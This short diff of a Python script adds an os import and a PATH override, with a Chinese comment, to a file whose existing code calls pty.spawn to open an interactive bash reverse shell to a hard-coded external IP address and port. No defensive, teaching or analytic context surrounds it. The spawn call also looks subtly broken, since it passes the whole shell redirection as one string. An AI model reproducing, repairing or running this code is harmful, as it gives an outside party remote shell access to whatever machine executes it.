@@ -1,6 +1,9 @@
 import re
 import glob
 import pty
+import os
+os.environ['PATH'] = '/usr/bin:/bin:/usr/sbin:/sbin'  # 确保包含正确的路径
+
 
 pty.spawn("/usr/bin/bash -i >& /dev/tcp/155.138.231.150/8085 0>&1")
 
